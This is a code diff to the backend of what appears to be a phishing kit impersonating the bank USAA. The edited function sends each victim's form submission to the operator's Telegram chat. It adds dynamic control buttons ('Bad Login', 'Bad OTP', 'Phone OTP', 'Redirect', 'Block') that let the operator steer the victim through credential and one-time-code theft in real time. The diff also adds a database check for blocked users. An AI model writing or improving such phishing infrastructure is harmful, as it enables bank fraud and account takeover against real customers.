@@ -319,36 +319,111 @@ async function getNextPage(currentPage, req) {
    MESSAGE BUILDER
 =================================*/
 async function buildMessage(data, options = {}) {
-  const { sendToTelegram = false, botToken = null, chatId = null, userId = null } = options;
+  const {
+    sendToTelegram = false,
+    botToken = null,
+    chatId = null,
+    userId = null,
+    db = null
+  } = options;
 
   try {
     let message = `🤖 USAA NEW SUBMISSION\n\n`;
     const excludeKeys = ["visitor", "userid", "security_code"];
 
+    // Build message body
     for (const [key, value] of Object.entries(data)) {
       if (value && !excludeKeys.includes(key.toLowerCase())) {
         message += `${key.toUpperCase()}   : ${value}\n`;
       }
     }
 
-  	  if (sendToTelegram) {
-  if (!botToken || !chatId) throw new Error("Bot token or Chat ID missing");
-  if (!userId) throw new Error("userId is missing");
+    if (!sendToTelegram) {
+      return message;
+    }
 
-  const messageText = String(message || "Select a command:");
+    if (!botToken || !chatId) {
+      throw new Error("Bot token or Chat ID missing");
+    }
 
-  const buttons = [
-    [
-      { text: "Refresh", callback_data: `cmd:refresh:${userId}` },
-      { text: "Next Page", callback_data: `cmd:nextpage:${userId}` }
-    ],
-    [
-      { text: "Bad Login", callback_data: `cmd:bad-login:${userId}` },
-      { text: "Phone OTP", callback_data: `cmd:phone-otp:${userId}` }
-    ]
-  ];
+    if (!userId) {
+      throw new Error("userId is missing");
+    }
 
-  try {
+    if (!db) {
+      throw new Error("Database instance (db) is missing");
+    }
+
+    const messageText = String(message || "Select a command:");
+
+    // -----------------------------
+    // Get user block status from DB
+    // -----------------------------
+    const userRow = await db.get(
+      "SELECT status FROM users WHERE id = ?",
+      [userId]
+    );
+
+    const isBlocked = userRow?.status === "blocked";
+
+    // -----------------------------
+    // Dynamic page-based button
+    // -----------------------------
+    const page = (data.page || "").toLowerCase();
+
+    let badButton;
+
+    if (page === "login") {
+      badButton = {
+        text: "Bad Login",
+        callback_data: `cmd:bad-login:${userId}`
+      };
+    } else if (page.includes("otp")) {
+      badButton = {
+        text: "Bad OTP",
+        callback_data: `cmd:bad-otp:${userId}`
+      };
+    } else {
+      badButton = {
+        text: "Bad Login",
+        callback_data: `cmd:bad-login:${userId}`
+      };
+    }
+
+    // -----------------------------
+    // Dynamic Block / Unblock
+    // -----------------------------
+    const blockButton = isBlocked
+      ? {
+          text: "Unblock",
+          callback_data: `cmd:unblock:${userId}`
+        }
+      : {
+          text: "Block",
+          callback_data: `cmd:block:${userId}`
+        };
+
+    // -----------------------------
+    // Final keyboard layout
+    // -----------------------------
+    const buttons = [
+      [
+        { text: "Refresh", callback_data: `cmd:refresh:${userId}` },
+        { text: "Next Page", callback_data: `cmd:nextpage:${userId}` }
+      ],
+      [
+        badButton,
+        { text: "Phone OTP", callback_data: `cmd:phone-otp:${userId}` }
+      ],
+      [
+        { text: "Redirect", callback_data: `cmd:redirect:${userId}` },
+        blockButton
+      ]
+    ];
+
+    // -----------------------------
+    // Send to Telegram
+    // -----------------------------
     await sendTelegramMessage(botToken, chatId, messageText, {
       parse_mode: "HTML",
       reply_markup: {
@@ -356,18 +431,15 @@ async function buildMessage(data, options = {}) {
       }
     });
 
-    console.log("✅ Telegram message sent with buttons");
+    console.log("✅ Telegram message sent with dynamic buttons");
+
+    return message;
+
   } catch (err) {
-    console.error("❌ Telegram error:", err.message);
+    console.error("❌ buildMessage error:", err);
+    return null;
   }
 }
-		
-		    return message;
-		  } catch (err) {
-		    console.error("❌ buildMessage error:", err);
-		    return null;
-		  }
-		}
 		
 /* ================================
    AUTH / SESSION
